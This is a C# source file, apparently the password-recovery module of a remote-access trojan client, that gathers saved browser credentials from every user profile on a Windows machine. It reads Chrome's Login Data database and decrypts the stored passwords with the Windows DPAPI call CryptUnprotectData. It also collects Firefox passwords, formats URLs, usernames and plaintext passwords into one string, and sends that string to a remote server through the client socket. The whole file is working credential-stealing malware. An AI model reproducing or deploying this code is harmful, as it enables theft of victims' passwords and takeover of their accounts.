using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using BrowserPass;
using Client.MessagePack;
using Client.Sockets;

namespace Client.Recovery
{
    internal class Recovery
    {
        public string Pass;

        public void recoverAll()
        {
            recoverChrome();
            recoverFirefox();
        }

        public Recovery()
        {
            this.Drive = Drive = new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory));
            recoverAll();
            if (Pass.Length > 1)
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "recoveryPassword";
                msgpack.ForcePathObject("Password").AsString = Pass;
                ClientSocket.Send(msgpack.Encode2Bytes());
            }
        }

        public DriveInfo Drive;

        private bool isWindowsXP()
        {
            return (Environment.OSVersion.Version.Major == 5);
        }

        private string[] GetAppDataFolders()
        {
            List<string> iList = new List<string>();
            if (isWindowsXP())
            {
                foreach (string Dir in Directory.GetDirectories(Drive.RootDirectory.FullName + @"Documents and Settings\", "*", SearchOption.TopDirectoryOnly))
                    iList.Add(Dir + "Application Data");
            }
            else
                foreach (string Dir in Directory.GetDirectories(Drive.RootDirectory.FullName + @"Users\", "*", SearchOption.TopDirectoryOnly))
                {
                    DirectoryInfo dirInfo = new DirectoryInfo(Dir);
                    iList.Add(Drive.RootDirectory.FullName + @"Users\" + dirInfo.Name + @"\AppData");
                }
            return iList.ToArray();
        }


        [DllImport("Crypt32.dll", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CryptProtectData(
    ref DATA_BLOB pDataIn,
    String szDataDescr,
    ref DATA_BLOB pOptionalEntropy,
    IntPtr pvReserved,
    ref CRYPTPROTECT_PROMPTSTRUCT pPromptStruct,
    CryptProtectFlags dwFlags,
    ref DATA_BLOB pDataOut
);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct DATA_BLOB
        {
            public int cbData;
            public IntPtr pbData;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct CRYPTPROTECT_PROMPTSTRUCT
        {
            public int cbSize;
            public CryptProtectPromptFlags dwPromptFlags;
            public IntPtr hwndApp;
            public String szPrompt;
        }

        [Flags]
        private enum CryptProtectPromptFlags
        {
            // prompt on unprotect
            CRYPTPROTECT_PROMPT_ON_UNPROTECT = 0x1,

            // prompt on protect
            CRYPTPROTECT_PROMPT_ON_PROTECT = 0x2
        }

        [Flags]
        private enum CryptProtectFlags
        {
            // for remote-access situations where ui is not an option
            // if UI was specified on protect or unprotect operation, the call
            // will fail and GetLastError() will indicate ERROR_PASSWORD_RESTRICTION
            CRYPTPROTECT_UI_FORBIDDEN = 0x1,

            // per machine protected data -- any user on machine where CryptProtectData
            // took place may CryptUnprotectData
            CRYPTPROTECT_LOCAL_MACHINE = 0x4,

            // force credential synchronize during CryptProtectData()
            // Synchronize is only operation that occurs during this operation
            CRYPTPROTECT_CRED_SYNC = 0x8,

            // Generate an Audit on protect and unprotect operations
            CRYPTPROTECT_AUDIT = 0x10,

            // Protect data with a non-recoverable key
            CRYPTPROTECT_NO_RECOVERY = 0x20,

            // Verify the protection of a protected blob
            CRYPTPROTECT_VERIFY_PROTECTION = 0x40
        }

        [
DllImport("Crypt32.dll",
SetLastError = true,
CharSet = System.Runtime.InteropServices.CharSet.Auto)
]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CryptUnprotectData(
    ref DATA_BLOB pDataIn,
    StringBuilder szDataDescr,
    ref DATA_BLOB pOptionalEntropy,
    IntPtr pvReserved,
    ref CRYPTPROTECT_PROMPTSTRUCT pPromptStruct,
    CryptProtectFlags dwFlags,
    ref DATA_BLOB pDataOut
);


        private string Decrypt(byte[] Datas)
        {
            try
            {
                DATA_BLOB inj, Ors = new DATA_BLOB();
                DATA_BLOB asd = new DATA_BLOB();
                GCHandle Ghandle = GCHandle.Alloc(Datas, GCHandleType.Pinned);
                inj.pbData = Ghandle.AddrOfPinnedObject();
                inj.cbData = Datas.Length;
                Ghandle.Free();
                CRYPTPROTECT_PROMPTSTRUCT asdf = new CRYPTPROTECT_PROMPTSTRUCT();
                string aha = string.Empty;
                CryptUnprotectData(ref inj, null, ref asd, default(IntPtr), ref asdf, 0, ref Ors);

                //            ref DATA_BLOB pDataIn,
                //StringBuilder szDataDescr,
                //    ref DATA_BLOB pOptionalEntropy,
                //    IntPtr pvReserved,
                //    ref CRYPTPROTECT_PROMPTSTRUCT pPromptStruct,
                //    CryptProtectFlags dwFlags,
                //    ref DATA_BLOB pDataOut

                byte[] Returned = new byte[Ors.cbData + 1];
                Marshal.Copy(Ors.pbData, Returned, 0, Ors.cbData);
                string TheString = Encoding.UTF8.GetString(Returned);
                return TheString.Substring(0, TheString.Length - 1);
            }
            catch
            {
                return "";
            }
        }

        public void recoverChrome()
        {
            try
            {
                foreach (string AppData in GetAppDataFolders())
                {
                    try
                    {
                        if (!File.Exists(AppData + @"\Local\Google\Chrome\User Data\Default\Login Data"))
                            continue;
                        SQLiteHandler sql = new SQLiteHandler(AppData + @"\Local\Google\Chrome\User Data\Default\Login Data");

                        try
                        {
                            sql.ReadTable("logins");
                        }
                        catch { }
                        Pass += "== Chrome ==========\n";
                        for (int i = 0; i <= sql.GetRowCount() - 1; i++)
                        {
                            string url = sql.GetValue(i, "origin_url");
                            string username = sql.GetValue(i, "username_value");
                            string password_crypted = sql.GetValue(i, "password_value");
                            string password = string.Empty;
                            if (!string.IsNullOrEmpty(password_crypted))
                            {
                                password = Decrypt(Encoding.Default.GetBytes(password_crypted));
                            }
                            else
                            {
                                password = "";
                            }

                            // Format like this:
                            // Type \n URL \n User \n Pass \n\n
                            Pass += url + "\nU: " + username + "\nP: " + password + "\n\n";
                        }
                    }
                    catch (Exception eax)
                    {
                        Console.WriteLine(eax.ToString());
                    }
                }
            }
            catch { }
        }
        public void recoverFirefox()
        {
            try
            {
                List<IPassReader> readers = new List<IPassReader>();
                readers.Add(new FirefoxPassReader());
                foreach (var reader in readers)
                {
                    Pass += "\n== Firefox ==========\n";
                    foreach (var d in reader.ReadPasswords())
                    {
                        Pass += d.Url + "\nU: " + d.Username + "\nP: " + d.Password + "\n\n";
                    }

                }
            }
            catch { };
        }
    }
}